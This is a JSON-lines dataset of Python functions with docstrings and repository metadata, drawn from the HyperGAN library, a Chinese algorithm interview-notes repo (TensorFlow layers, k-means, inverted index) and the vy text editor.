{"docstring": "\"\"\" Chooses a random configuration from a list of configs (separated by newline) \"\"\"\n", "func_signal": "def random_config_from_list(config_list_file):\n", "code": "lines = tuple(open(config_list_file, 'r'))\nconfig_file = random.choice(lines).strip()\nprint(\"[hypergan] config file chosen from list \", config_list_file, '  file:', config_file)\nreturn hg.configuration.Configuration.load(config_file+\".json\")", "path": "HyperGAN/examples/common.py", "commit_date": "2020-08-23 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\nInitializes a gan component based on a `gan` and a `config` dictionary.\n\nDifferent components require different config variables.  \n\nA `ValidationException` is raised if the GAN component configuration fails to validate.\n\"\"\"\n", "func_signal": "def __init__(self, gan, config):\n", "code": "super(GANComponent, self).__init__()\nself.gan = gan\nself.config = hc.Config(config)\nerrors = self.validate()\nif errors != []:\n    raise ValidationException(self.__class__.__name__+\": \" +\"\\n\".join(errors))\nself.create()", "path": "HyperGAN/hypergan/gan_component.py", "commit_date": "2020-08-17 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be scaled.\n\nReturns:\n    PIL Image: Rescaled image.\n\"\"\"\n", "func_signal": "def __call__(self, img):\n", "code": "width, height = img.size\nh, w = self.size\n\nv_scale = height / h\nh_scale = width / w\nscale = min(h_scale, v_scale)\nmin_size = [scale * h, scale * w]\n\nimg = F.center_crop(img, min_size)\n\nreturn F.resize(img, self.size, self.interpolation)", "path": "HyperGAN/hypergan/inputs/crop_resize_transform.py", "commit_date": "2020-08-01 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\" Samples to a file.  Useful for visualizing the learning process.\n\nIf allow_save is False then saves will not be created.\n\nUse with:\n\n     ffmpeg -i samples/grid-%06d.png -vcodec libx264 -crf 22 -threads 0 grid1-7.mp4\n\nto create a video of the learning process.\n\"\"\"\n", "func_signal": "def sample(self, allow_save=True):\n", "code": "sample_file=\"samples/%s/%06d.png\" % (self.config_name, self.samples)\nself.create_path(sample_file)\nself.lazy_create()\nsample_list = self.sampler.sample(sample_file, allow_save and self.args.save_samples)\nprint(\"Devices D:\")\nfor component in self.gan.discriminator_components():\n    print(component.device)\nprint(\"Devices G:\")\nfor component in self.gan.generator_components():\n    print(component.device)\n\nif allow_save:\n    self.samples += 1\n\nreturn sample_list", "path": "HyperGAN/hypergan/cli.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\" Chooses a random configuration from a list of configs (separated by newline) \"\"\"\n", "func_signal": "def random_config_from_list(config_list_file):\n", "code": "lines = tuple(open(config_list_file, 'r'))\nconfig_file = random.choice(lines).strip()\nprint(\"[hypergan] config file chosen from list \", config_list_file, '  file:', config_file)\nreturn hg.configuration.Configuration.load(config_file+\".json\")", "path": "HyperGAN/examples/chargan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "#d_loss = self.gan.loss.sample[0]\n#g_loss = self.gan.loss.sample[1]\n#d_params = self.gan.d_vars()\n#g_params = self.gan.g_vars()\n", "func_signal": "def forward(self, d_loss, g_loss):\n", "code": "if self.config.locally_stable:\n    d_adversarial_norm_sq = tf.square(tf.global_norm(tf.gradients(g_loss, d_params)))\n    self.d_loss = self.config.locally_stable_gamma * d_adversarial_norm_sq\n    self.gan.add_metric('locally_stable', self.d_loss)\n\nreturn [self.d_loss, self.g_loss]", "path": "HyperGAN/hypergan/train_hooks/conjecture_train_hook.py", "commit_date": "2020-06-26 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\n    Runs a forward pass through the GAN and returns (d_real, d_fake)\n\"\"\"\n", "func_signal": "def forward_pass(self):\n", "code": "print(\"Warning: BaseGAN.forward_pass() called directly.  Please override\")\nreturn None, None", "path": "HyperGAN/hypergan/gans/base_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\nEach point of a is measured against the closest point on b.  Distance differences are added together.  \n\nThis works best on a large batch of small inputs.\"\"\"\n\n", "func_signal": "def distribution_accuracy(a, b):\n", "code": "shape = a.shape\ntiled_a = a.view(shape[0], 1, shape[1]).repeat(1, shape[0], 1)\ntiled_b = b.view(1, shape[0], shape[1]).repeat(shape[0], 1, 1)\n\ndifference = torch.abs(tiled_a-tiled_b)\ndifference = torch.min(difference, dim=1)[0]\ndifference = torch.sum(difference, dim=1)\nreturn torch.sum(difference, dim=0)", "path": "HyperGAN/examples/common.py", "commit_date": "2020-08-23 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "# get (memory_size - topk) x_hats\n", "func_signal": "def before_step(self, step, feed_dict):\n", "code": "for i,s in enumerate(self.assign_s_max_new_entries[self.top_k:]):\n    self.gan.session.run(s)\n# sort memory\nscores = []\nfor i in range(self.memory_size):\n    self.gan.session.run(self.assign_current[i])\n    s = self.gan.session.run(self.d_loss)\n    scores.append(s)\nsort = zip(scores, self.s_max, self.assign_s_max_new_entries)\nsort2 = sorted(sort, key=itemgetter(0), reverse=True)\nnew_s_max = [s_max for _, s_max,_ in sort2]\nnew_assign = [a for _, _,a in sort2]\nself.s_max = new_s_max\nself.assign_s_max_new_entries = new_assign\n# get max\nif self.config.all:\n    winner = sum(scores)\nelse:\n    winner = scores[np.argmax(scores)]\n\n# truncate memory to top_k\nfeed_dict[self.d_loss] = winner", "path": "HyperGAN/hypergan/train_hooks/needs_pytorch/max_gp_train_hook.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "#TODO add optimizer params\n", "func_signal": "def d_parameters(self):\n", "code": "for component in self.gan.discriminator_components():\n    for param in component.parameters():\n        yield param", "path": "HyperGAN/hypergan/trainable_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\" Initialized a new GAN.\"\"\"\n", "func_signal": "def __init__(self, config=None, inputs=None, device=\"cuda\"):\n", "code": "self._metrics = {}\nself.components = {}\nself.destroy = False\nself.inputs = inputs\nself.steps = Variable(torch.zeros([1]))\n\nif config == None:\n    config = hg.Configuration.default()\n\nself.config = config\nself.device = device\nself.create()\nself.hooks = self.setup_hooks()\nself.train_hooks = TrainHookCollection(self)", "path": "HyperGAN/hypergan/gans/base_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "#TODO add optimizer params\n", "func_signal": "def g_parameters(self):\n", "code": "for component in self.gan.generator_components():\n    for param in component.parameters():\n        yield param", "path": "HyperGAN/hypergan/trainable_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\nValidates a GANComponent.  Return an array of error messages. Empty array `[]` means success.\n\"\"\"\n", "func_signal": "def validate(self):\n", "code": "errors = []\nrequired = self.required()\nfor argument in required:\n    if(self.config.__getattr__(argument) == None):\n        errors.append(\"`\"+argument+\"` required\")\n\nif(self.gan is None):\n    errors.append(\"GANComponent constructed without GAN\")\nreturn errors", "path": "HyperGAN/hypergan/gan_component.py", "commit_date": "2020-08-17 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\n    Runs a forward pass through the discriminator and returns the discriminator output\n\"\"\"\n", "func_signal": "def forward_discriminator(self, inputs):\n", "code": "print(\"Warning: BaseGAN.forward_discriminator() called directly.  Please override\")\nreturn None", "path": "HyperGAN/hypergan/gans/base_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"adds metric to the gan\n    name:string\n    value:Tensor\n\"\"\"\n", "func_signal": "def add_metric(self, name, value):\n", "code": "self._metrics[name] = value\nreturn self._metrics", "path": "HyperGAN/hypergan/gans/base_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\n    Called repeatedly regardless of gan state.\n\"\"\"\n", "func_signal": "def tick(self):\n", "code": "if hasattr(self, 'root'):\n    self.root.update()", "path": "HyperGAN/hypergan/tk_viewer.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\"\nReferences:\n    tflearn.utils.get_incoming_shape\n\"\"\"\n", "func_signal": "def get_shape(x):\n", "code": "if isinstance(x, (tf.Tensor, tf.SparseTensor)):\n    return x.get_shape().as_list()\nelif type(x) in [np.array, np.ndarray, list, tuple]:\n    return list(np.shape(x))\nelse:\n    raise Exception(\"Invalid `x`.\")", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/utils/__init__.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u52a0\u8f7d\u6570\u636e\n    \u6e90\u6570\u636e\u683c\u5f0f\u4e3a\u591a\u884c\uff0c\u6bcf\u884c\u4e3a\u4e24\u4e2a\u6d6e\u70b9\u6570\uff0c\u5206\u522b\u8868\u793a (x,y)\n\"\"\"\n", "func_signal": "def load_data(file_path):\n", "code": "data = []\nwith open(file_path, 'r', encoding='utf-8') as fr:\n    for line in fr.read().splitlines():\n        line_float = list(map(float, line.split('\\t')))\n        data.append(line_float)\ndata = np.array(data)\nreturn data", "path": "Algorithm_Interview_Notes-Chinese/_codes/machine_learning/KMeans/kmeans.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\n\nArgs:\n    ret(dict):\n\nReturns:\n\n\"\"\"\n", "func_signal": "def printy(ret):\n", "code": "for k, v in ret.items():\n    tokens = list(k)\n    print(tokens)\n    if v:\n        for t in v:\n            print('\\t', t)\n    else:\n        print('\\t', '---')", "path": "Algorithm_Interview_Notes-Chinese/_codes/model/\u5012\u6392\u7d22\u5f15/inverse_index.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u4ee5\u5b57\u5178\u5f62\u5f0f\u83b7\u53d6\u6240\u6709 trainable \u53c2\u6570\"\"\"\n", "func_signal": "def get_params_dict():\n", "code": "param_dict = dict()\nfor var in tf.trainable_variables():\n    param_dict[var.name] = {\"shape\": list(map(int, var.shape)),\n                            \"number\": int(reduce(mul, var.shape, 1))}\nreturn param_dict", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/utils/__init__.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\nx = 0.                  x < -2.5\n  = 1.                  x > 2.5\n  = 0.2 * x + 0.5       otherwise\n\"\"\"\n", "func_signal": "def hard_sigmoid(x):\n", "code": "x = (0.2 * x) + 0.5\nx = tf.clip_by_value(x, 0., 1.)\nreturn x", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/activations/__init__.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\nIn:  [N, max_n_word, max_n_char]\nOut: [N, max_n_word, c_embed_size]\n\nmax_n_word: \u53e5\u5b50\u7684\u6700\u5927\u957f\u5ea6\nmax_n_char: \u5355\u8bcd\u7684\u6700\u5927\u957f\u5ea6\n\nArgs:\n    x:\n    c_embed_size:\n    share_cnn_weights:\n    name:\n    reuse:\n\nReturns:\n\n\"\"\"\n", "func_signal": "def char_cnn_embedding(x, c_embed_size=8, share_cnn_weights=True, name=\"char_cnn_embedding\", reuse=None):\n", "code": "max_sentence_len, max_word_len, char_vocab_size = get_shape(x)[1:]\n\nwith tf.variable_scope(name, reuse=reuse):\n    char_embed_mat = get_w([char_vocab_size, c_embed_size], name=\"char_embed_matrix\")", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/layers/embedding/char_cnn.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u591a\u5c42\u5168\u8fde\u63a5\nInput shape:  [batch_size, n_input]\nOutput shape: [batch_size, n_unit_list[-1]]\n\nArgs:\n    x(tf.Tensor):\n    n_unit_ls(list of int):\n    act_fn:\n    name(str):\n\"\"\"\n# n_layer = len(n_unit_list)\n", "func_signal": "def multi_dense(x, n_unit_ls, act_fn=relu, name=None):\n", "code": "name = name or \"dense\"\nfor i, n_unit in enumerate(n_unit_ls):\n    x = dense(x, n_unit, act_fn=act_fn, name=\"{}-{}\".format(name, i))\n\nreturn x", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/layers/dense.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u53c2\u6570\u5316 ReLU\n\nReferences:\n    tflearn.prelu\n\"\"\"\n", "func_signal": "def parametric_relu(x, channel_shared=False, alpha_init=constant(0.), name=\"parametric_relu\", reuse=None):\n", "code": "if channel_shared:\n    alpha_shape = get_shape(x)[-1:]\nelse:\n    alpha_shape = [1]\n\nwith tf.variable_scope(name, reuse=reuse):\n    alpha = get_w(alpha_shape, w_initializer=alpha_init, name=\"alpha\")\n    # o = relu(x) + 0.5 * tf.multiply(alpha, x - tf.abs(x))  # TFLearn\n    o = leaky_relu(x, alpha)  # TensorLayer / <Deep Learning>\n\nreturn o", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/activations/relu.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u5168\u8fde\u63a5\u5c42\nInput shape:  [batch_size, n_input]\nOutput shape: [batch_size, n_unit]\n\n\u5982\u679c\u9700\u8981 reuse \u63a8\u8350\u4f7f\u7528\u7c7b\u5b9e\u73b0\u7684 `Dense`\n\nArgs:\n    x(tf.Tensor):\n    n_unit(int): \n    act_fn:\n    name(str):\n    reuse(bool):\n\"\"\"\n# n_input = tf.shape(x)[-1]  # err: need int but tensor\n", "func_signal": "def dense(x, n_unit, act_fn=relu, name=None, reuse=None):\n", "code": "n_input = int(x.get_shape()[-1])\nwith tf.variable_scope(name or \"dense\", reuse=reuse):\n    W, b = get_wb([n_input, n_unit])\n    o = act_fn(tf.matmul(x, W) + b)\nreturn o", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/layers/dense.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\nArgs:\n    x: \u6ce8\u610f x.dtype == float32\n\"\"\"\n# x = tf.cast(x, dtype=tf.float32)  # \u4ea4\u7ed9\u5916\u90e8\u5904\u7406\n", "func_signal": "def __call__(self, x):\n", "code": "loss_regularization = 0.\nif self.l1:\n    loss_regularization += tf.reduce_sum(self.l1 * tf.abs(x))\nif self.l2:\n    loss_regularization += tf.reduce_sum(self.l2 * tf.square(x))\nreturn loss_regularization", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/regularizers/L1L2.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u7528\u4e8e\u5168\u8fde\u63a5\u5c42\u7684 highway\nInput shape:  [batch_size, n_input]\nOutput shape: [batch_size, n_input]\n\n\u516c\u5f0f\n    `o = H(x, W)T(x, W) + x(1 - T(x, W))`\n\u5176\u4e2d\n    H, T = dense\n\"\"\"\n", "func_signal": "def highway_dense(x, act_fn=relu, carry_bias=-1.0, name=None):\n", "code": "n_input = int(x.get_shape()[-1])\nwith tf.variable_scope(name or \"highway_dense\"):\n    W, b = get_wb([n_input, n_input])\n\n    with tf.variable_scope(\"transform\"):\n        W_T, b_T = get_wb([n_input, n_input], b_initializer=tf.initializers.constant(carry_bias))\n\n    H = act_fn(tf.matmul(x, W) + b)\n    T = sigmoid(tf.matmul(x, W_T) + b_T)\n    o = tf.multiply(H, T) + tf.multiply(x, (1. - T))\n\nreturn o", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/layers/highway.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u83b7\u53d6\u53c2\u6570\u603b\u91cf\"\"\"\n", "func_signal": "def get_params_number():\n", "code": "param_dict = get_params_dict()\nreturn sum((item[\"number\"] for item in param_dict.values()))", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/utils/__init__.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\nArgs:\n    l1(float): L1 \u6b63\u5219\u5316\u7684\u7cfb\u6570\n    l2(float): L2 \u6b63\u5219\u5316\u7684\u7cfb\u6570\n\"\"\"\n", "func_signal": "def __init__(self, l1=0., l2=0.):\n", "code": "self.l1 = np.asarray(l1, dtype=np.float32)\nself.l2 = np.asarray(l2, dtype=np.float32)", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/regularizers/L1L2.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\n\nArgs:\n    txt(str):\n    inverse_index(dict):\n    word_freq(dict):\n\nReturns:\n    dict\n\"\"\"\n", "func_signal": "def search(txt, inverse_index, word_freq=None):\n", "code": "tokens = tokenizer.tokenize(txt)\ntokens = [word_clean(token) for token in tokens]\n\nret = search_tokens(tokens, inverse_index, word_freq)\n\nfor i in range(2, len(tokens) + 1):\n    for ts in combinations(tokens, i):\n        ret[frozenset(ts)] = set.intersection(*[ret[frozenset([t])] for t in ts])\n\n# tokens_list = get_all_subset(tokens)\n# for tokens in tokens_list:\n#     ret[tokens] = search_tokens(tokens, inverse_index, word_freq)\n\nreturn ret", "path": "Algorithm_Interview_Notes-Chinese/_codes/model/\u5012\u6392\u7d22\u5f15/inverse_index.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u591a\u5c42 highway_dense\nInput shape:  [batch_size, n_input]\nOutput shape: [batch_size, n_input]\n\"\"\"\n", "func_signal": "def multi_highway_dense(x, n_layer, act_fn=relu, carry_bias=-1.0, name=None):\n", "code": "name = name or \"highway_dense\"\nfor i in range(n_layer):\n    x = highway_dense(x, act_fn=act_fn, carry_bias=carry_bias, name=\"{}-{}\".format(name, i))\n\nreturn x", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/layers/highway.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u968f\u673a\u91c7\u6837 k \u4e2a\u6837\u672c\u4f5c\u4e3a\u805a\u7c7b\u4e2d\u5fc3\"\"\"\n", "func_signal": "def rand_center(data, k):\n", "code": "centers = np.array(random.sample(list(data), k))\nreturn centers", "path": "Algorithm_Interview_Notes-Chinese/_codes/machine_learning/KMeans/kmeans.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u8ba1\u7b97\u4e24\u4e2a\u70b9\u4e4b\u95f4\u7684\u6b27\u5f0f\u8ddd\u79bb\"\"\"\n", "func_signal": "def score_euclidean(a, b):\n", "code": "s = np.sqrt(np.sum(np.power(a - b, 2)))\nreturn s", "path": "Algorithm_Interview_Notes-Chinese/_codes/machine_learning/KMeans/kmeans.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\nK-Means \u7b97\u6cd5\n\n\u4e00\u822c K-Mean \u7b97\u6cd5\u7684\u7ec8\u6b62\u6761\u4ef6\u6709\u5982\u4e0b\u51e0\u4e2a\uff1a\n    1. \u6240\u6709\u6837\u672c\u7684\u7c7b\u522b\u4e0d\u518d\u6539\u53d8\n    2. \u8fbe\u5230\u6700\u5927\u8fed\u4ee3\u6b21\u6570\n    3. \u7cbe\u5ea6\u8fbe\u5230\u8981\u6c42\uff08\uff1f\uff09\n\n\u8fd4\u56de\u805a\u7c7b\u4e2d\u5fc3\u53ca\u805a\u7c7b\u7ed3\u679c\n\"\"\"\n# \u6837\u672c\u6570\n", "func_signal": "def k_means(data, k, max_iter=100, score=score_euclidean, e=1e-6):\n", "code": "n = len(data)\n\n# \u4fdd\u5b58\u7ed3\u679c\n# \u6bcf\u4e2a\u7ed3\u679c\u4e3a\u4e00\u4e2a\u4e8c\u5143\u7ec4 [label, score] \u5206\u522b\u4fdd\u5b58\u6bcf\u4e2a\u6837\u672c\u6240\u5728\u7684\u7c07\u53ca\u8ddd\u79bb\u8d28\u5fc3\u7684\u8ddd\u79bb\nret = np.array([[-1, np.inf]] * n)\n\n# \u9009\u53d6\u805a\u7c7b\u4e2d\u5fc3\ncenters = rand_center(data, k)\n\nchanged = True  # \u6807\u8bb0\u6837\u672c\u7c7b\u522b\u662f\u5426\u6539\u53d8\nn_iter = 0  # \u8bb0\u5f55\u8fed\u4ee3\u6b21\u6570\nwhile changed and n_iter < max_iter:\n    changed = False\n    n_iter += 1\n\n    for i in range(n):  # \u5bf9\u6bcf\u4e2a\u6570\u636e\n        i_score = np.inf\n        i_label = -1\n        for j in range(k):  # \u4e0e\u6bcf\u4e2a\u8d28\u5fc3\u6bd4\u8f83\n            s_ij = score(data[i], centers[j])\n            if s_ij < i_score:\n                i_score = s_ij\n                i_label = j\n\n        if ret[i, 0] != i_label:  # \u6837\u672c\u7684\u7c7b\u522b\u53d1\u751f\u4e86\u6539\u53d8\n            changed = True\n\n        ret[i, :] = i_label, i_score\n\n    # \u66f4\u65b0\u805a\u7c7b\u4e2d\u5fc3\n    log.info(centers)\n    for i in range(k):\n        data_i = data[ret[:, 0] == i]  # \u6807\u7b7e\u4e3a i \u7684\u6837\u672c\n        centers[i, :] = np.mean(data_i, axis=0)  # \u6309\u7c7b\u522b\u8fc7\u6ee4\u6837\u672c\n\nlog.info(n_iter)  # \u8fed\u4ee3\u6b21\u6570\nreturn centers, ret", "path": "Algorithm_Interview_Notes-Chinese/_codes/machine_learning/KMeans/kmeans.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u622a\u65ad ReLU\n`o = min(max(0., x), max_value)`\n\"\"\"\n", "func_signal": "def clip_relu(x, max_value):\n", "code": "o = tf.nn.relu(x)\no = tf.minimum(o, max_value)\nreturn o", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/activations/relu.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"\u7f29\u653e\u578b\u6307\u6570\u7ebf\u6027\u5355\u5143\"\"\"\n", "func_signal": "def selu(x):\n", "code": "alpha = 1.6732632423543772848170429916717\nscale = 1.0507009873554804934193349852946\no = tf.nn.elu(x)\nreturn scale * tf.where(x > 0, o, alpha * o)", "path": "Algorithm_Interview_Notes-Chinese/_codes/my_tensorflow/src/activations/__init__.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "DarLiner/Algorithm_Interview_Notes-Chinese", "stars": 2009, "license": "None", "language": "python", "size": 225248}
{"docstring": "\"\"\"  \nIt adds or removes block selection one line down.  \n\"\"\"\n\n", "func_signal": "def block_down(self, event):\n", "code": "a, b  = self.area.indexref('(CURSOR_LAST_COL)')\nc, d  = self.area.indexref()\n\nindex = self.area.index('(BLOCK_SEL_MARK)')\nself.rmblock(index, '%s.%s' % (c, b))\nself.area.down()\n\na, b   = self.area.indexref('(CURSOR_LAST_COL)')\nc, d = self.area.indexref()\n\nself.addblock(index, '%s.%s' % (c, b))", "path": "vy/vyapp/plugins/block_sel.py", "commit_date": "2019-12-28 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nActivate python completion when file extension is not \ndetected automatically.\n\"\"\"\n", "func_signal": "def acp(area):\n", "code": "area.hook('jedi', 'INSERT', '<Control-Key-period>', \nlambda event: PythonCompletionWindow(event.widget), add=False)", "path": "vy/vyapp/plugins/jedi.py", "commit_date": "2019-12-28 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIn order to update a snippet it has to contain\na field @(id)\n\"\"\"\n\n", "func_signal": "def store(self, data):\n", "code": "values = (data, self.area.join_ranges('sel', '\\n'))\n\nself.area.tag_remove('sel', 'sel.first', 'sel.last')\n\nself.cur.execute('''INSERT INTO snippet \n(title, data) VALUES (?, ?)''', values)\n\nself.conn.commit()\nself.area.chmode('NORMAL')\n\nroot.status.set_msg('Snippet saved!')", "path": "vy/vyapp/plugins/ysnippet.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nThis method adds a new horizontal window and loads\nthe content of the files passed as args in the new AreaVi\n\nwidgets.\n\"\"\"\n\n", "func_signal": "def load(self, *args):\n", "code": "base = PanedHorizontalWindow(master=self)\nself.add(base)\n\nfor ind in args:\n    base.load(ind)\nreturn base", "path": "vy/vyapp/panel.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nOpen a file using the appropriate program for. \n\"\"\"\n\n", "func_signal": "def openfile(self):\n", "code": "filename = self.area.get_line()\n# No need for \"\" because it is passing the entire filename\n# as parameter.\nPopen(['xdg-open', '%s'  % filename])", "path": "vy/vyapp/plugins/xdg_open.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt scrolls one page down.\n\"\"\"\n\n", "func_signal": "def scroll_down(self, event):\n", "code": "self.area.yview(SCROLL, 1, 'page')\nself.area.mark_set('insert', '@0,0')", "path": "vy/vyapp/plugins/page_scroll.py", "commit_date": "2020-06-24 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt scrolls one line down.\n\"\"\"\n\n", "func_signal": "def scroll_down(self, event):\n", "code": "self.area.yview(SCROLL, 1, 'units')\nis_visible = self.area.dlineinfo('insert')\n\nif not is_visible:\n    self.area.mark_set('insert', 'insert +1l')", "path": "vy/vyapp/plugins/line_scroll.py", "commit_date": "2018-07-21 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "# When calling destroy or withdraw without \n# self.deoiconify it doesnt give back \n# the focus to the parent window.\n\n", "func_signal": "def close(self):\n", "code": "self.deiconify()\nself.grab_release()\nself.withdraw()", "path": "vy/vyapp/widgets.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
